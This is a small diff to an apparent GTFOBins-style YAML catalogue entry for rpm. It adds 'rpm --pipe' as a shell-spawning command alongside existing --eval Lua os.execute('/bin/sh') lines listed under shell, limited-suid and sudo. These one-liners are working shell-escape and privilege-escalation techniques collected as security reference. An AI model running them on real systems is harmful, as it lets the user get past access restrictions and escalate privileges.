@@ -2,6 +2,7 @@
 functions:
   shell:
     - code: rpm --eval '%{lua:os.execute("/bin/sh")}'
+    - code: rpm --pipe '/bin/sh 0<&1'
   limited-suid:
     - code: ./rpm --eval '%{lua:os.execute("/bin/sh")}'
   sudo:
